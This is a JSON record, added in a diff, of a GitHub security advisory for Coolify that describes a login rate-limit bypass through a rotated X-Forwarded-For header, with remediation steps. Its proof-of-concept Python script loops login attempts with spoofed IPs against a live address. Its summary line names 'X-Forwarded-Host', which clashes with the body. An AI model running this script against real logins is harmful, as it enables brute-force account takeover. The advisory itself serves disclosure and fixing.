@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-688j-rm43-5r8x",
+  "repo": {
+    "cve_id": "CVE-2025-64422",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "### Summary\r\nThe following issue was identified using Aikido’s AI pentest service.\r\n\r\nThe /login endpoint advertises a rate limit of 5 requests but can be trivially bypassed by rotating the X-Forwarded-For header. This enables unlimited credential stuffing and brute-force attempts against user and admin accounts.\r\n\r\n### Details\r\nThe authentication endpoint at http://coolify-instance/login presents `X-RateLimit-*` headers suggesting a limit of 5 attempts. However, the endpoint appears to key its limiter off the client IP derived from `X-Forwarded-For.` By varying `X-Forwarded-For` per request, the remaining counter is reset to 4 on every try, demonstrating a trivial bypass of any per-IP rate limiting.\r\n\r\nTechnically, the login flow requires a CSRF `_token` and session cookie, which are easily obtained by a `GET /login` request. When `X-Forwarded-For` is rotated, each request is treated as a new \"bucket” with `RL=5/4`and no lockout, allowing unlimited attempts within a short period.\r\n\r\nConditions for exploitation are minimal: an attacker only needs network access to the endpoint. The attack does not require a valid session beyond the standard anonymous session established by visiting the login page.\r\n\r\n### PoC\r\nBypass rate limiting entirely by rotating X-Forwarded-For per request:\r\n\r\n```python\r\npython3 - << 'PY'\r\nimport re, requests, time\r\nbase='http://46.62.212.163:8000'\r\nua={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64)'}\r\ns=requests.Session()\r\n_tok=re.search(r'name=\"_token\"\\s+value=\"([^\"]+)\"', s.get(base+'/login', headers=ua).text).group(1)\r\nfor i in range(1,15):\r\n    headers=ua.copy(); headers['X-Forwarded-For']=f'198.51.100.{i}'\r\n    r=s.post(base+'/login', data={'_token':_tok,'email':'grumpinout+admin@wearehackerone.com','password': f'WrongPass{i}!'}, allow_redirects=False, headers=headers)\r\n    print(f'Attempt {i:02d}: status={r.status_code}, RL={r.headers.get(\"X-RateLimit-Limit\")}/{r.headers.get(\"X-RateLimit-Remaining\")}')\r\n    time.sleep(0.2)\r\nPY\r\n```\r\n\r\nObserved during testing: every attempt returns 302 and RL header shows 5/4 for most requests, indicating  fresh bucket per spoofed IP. Example lines: Attempt 01: 302, RL=5/4; Attempt 02: 302, RL=5/4; ... Attempt 14: 302, RL=5/4.\r\n\r\n### Impact\r\nUnlimited brute-force against login enables high-likelihood account takeover for administrative and user accounts. This can lead to compromise of all deployments, secrets, and infrastructure controlled by the platform, service disruption, and data breaches. The risk is high given the ease of exploitation and direct impact on authentication integrity. Regulatory consequences may arise if user accounts or stored secrets are compromised.\r\n\r\n\r\n### Remediation\r\n- Derive client IP from a trusted proxy chain only; ignore arbitrary `X-Forwarded-For` headers from clients unless behind a configured reverse proxy (set trusted proxies).\r\n- Key the throttle to both username/email and verified client IP.\r\n- Introduce exponential backoff or fixed cooldown per account after repeated failures; consider temporary account lock after threshold.\r\n- Enable MFA for privileged accounts and support WebAuthn/Authenticator-based 2FA to reduce brute-force risk.\r\n- Add alerting for repeated failed login attempts and consider CAPTCHA after thresholds.",
+    "ghsa_id": "GHSA-688j-rm43-5r8x",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-688j-rm43-5r8x",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-688j-rm43-5r8x"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-64422"
+      }
+    ],
+    "published_at": "2026-01-03T15:15:13Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Rate-limit bypass on login via X-Forwarded-Host header",
+    "updated_at": "2026-01-08T19:06:48Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Coolify"
+        },
+        "patched_versions": "v4.0.0-beta.436",
+        "vulnerable_version_range": "< v4.0.0-beta.435"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
